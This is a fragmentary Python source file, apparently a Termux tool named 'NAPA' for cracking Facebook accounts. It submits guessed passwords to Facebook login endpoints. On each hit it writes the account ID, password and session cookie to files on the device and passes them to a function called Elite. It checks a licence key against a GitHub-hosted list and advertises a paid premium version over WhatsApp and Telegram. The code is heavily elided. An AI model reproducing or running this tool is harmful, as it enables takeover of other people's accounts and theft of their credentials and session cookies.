...
totaldmp = 0
filter = []
os.system("xdg-open https://t.me/termuxfreecomand143")
...
__________________________________________________
 ...
 \033[1;92m  ❤️❤️❤️ \033[1;31mAUTHOR:MR . EMON (NAPA)\033[1;92m ❤️❤️❤️                                                       
──────────────────────────────────────────────────
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back NAPA Menu ")
        exit()
os.system("xd-open https://github.com/arohi999")
def menu():   
    os.system('clear')
    print(logo)
  ...
  ###  elif select =='2':
       ...
       os.system('xdg-open https://t.me/+8801867850909');menu()
    else:
        print('\n Select Wrong option ... ')
        time.sleep(2)
        NIX(allkey)
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    break
                     ...
                     #print(f"\r\x1b[1;96m [NAPA-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/NAPA/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//NAPA/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/NAPA/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNAPA-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/NAPA/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard//NAPA/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[NAPA X-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('NAPA X-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[NAPA-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('NAPA-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
...
def main_apv():
    ...
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://raw.githubusercontent.com/arohi999/NAPAPRO/main/NAPA.txt').text
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            os.system("clear")
            print(logo)
            print(f" \033[1;92mYour Key :\033[31;1m{NAPA}")
            ...
            print("-----------------------------------------------------")
            url_wa = "https://api.whatsapp.com/send?phone=+8801867850909&text="
            choice = input(" Enter your choice  : ")
            tks = ("Hi Nix Sir, I Need To Buy Your NAPA TOOL Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
